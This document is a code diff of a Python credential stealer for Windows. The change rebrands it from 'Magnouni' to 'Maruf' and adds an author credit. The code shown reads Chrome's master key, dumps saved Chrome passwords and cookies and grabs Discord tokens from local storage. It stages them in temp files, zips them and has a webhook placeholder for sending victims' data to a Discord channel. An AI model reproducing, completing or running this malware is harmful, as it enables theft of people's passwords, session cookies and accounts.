@@ -12,13 +12,13 @@ from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
 
-class Magnouni_Main:
+class Maruf_Main:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE" #Discord WebHook To Send All The Target Infos On
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = os.getenv("temp")+"\\magnouni"
+        self.tempfolder = os.getenv("temp")+"\\maruf"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -114,7 +114,7 @@ class Magnouni_Main:
     
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Magnouni-Google Passwords.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.tempfolder+"\\Maruf-Google Passwords.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made By Maruf https://github.com/maruf132\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
@@ -144,7 +144,7 @@ class Magnouni_Main:
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Magnouni-Google Cookies.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.tempfolder+"\\Maruf-Google Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made By Maruf https://github.com/maruf132\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
@@ -173,7 +173,7 @@ class Magnouni_Main:
             pass
 
     def grabTokens(self):
-        f = open(self.tempfolder+"\\Magnouni-DiscordInfo.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.tempfolder+"\\Maruf-DiscordInfo.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made By Maruf https://github.com/maruf132\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
@@ -322,4 +322,4 @@ class Magnouni_Main:
         zipped_file.close()
             
 if __name__ == "__main__":
-    Magnouni_Main()
+    Maruf_Main()
